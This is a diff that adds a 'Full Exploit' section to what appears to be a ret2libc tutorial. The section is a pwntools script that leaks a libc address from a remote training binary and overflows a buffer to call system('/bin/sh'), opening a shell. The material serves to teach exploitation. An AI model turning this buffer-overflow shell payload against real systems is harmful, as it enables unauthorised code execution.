@@ -171,3 +171,31 @@ This process is also known as a `ret2libc`. The `ret2libc` exploit involves gett
 Since ASLR was enabled, we had to beat ASLR and then perform the `ret2libc`. ASLR is not always enabled for it to be a `ret2libc` exploit. If ASLR is not enabled, we can just jump to `system()` and pass `/bin/sh` as the argument.
 
 Later on, we'll introduce another technique called the `ret2plt`, which beats ASLR but jumps to a location on the PLT table instead of the function itself. This is useful when we don't have a leak, but we know the address of a function in the PLT table. We'll cover this at the end of the ASLR section.
+
+## Full Exploit
+{% code title="exploit.py" lineNumbers="true" %}
+```python
+from pwn import *
+
+elf = context.binary = ELF('./groundzero')
+libc = elf.libc
+proc = remote('vunrotc.cole-ellis.com', 6100)
+
+# get the leak
+proc.recvuntil('at: ')
+leak = int(proc.recvline(), 16)
+
+# get address
+libc.address = leak - libc.sym.system
+print(f"LIBC leaked! {hex(libc.address)}")
+
+# perform ret2libc
+payload = b'A' * 56
+payload += p32(libc.sym.system)
+payload += p32(0x0)
+payload += p32(next(libc.search(b'/bin/sh')))
+
+proc.sendline(payload)
+proc.interactive()
+```
+{% endcode %}
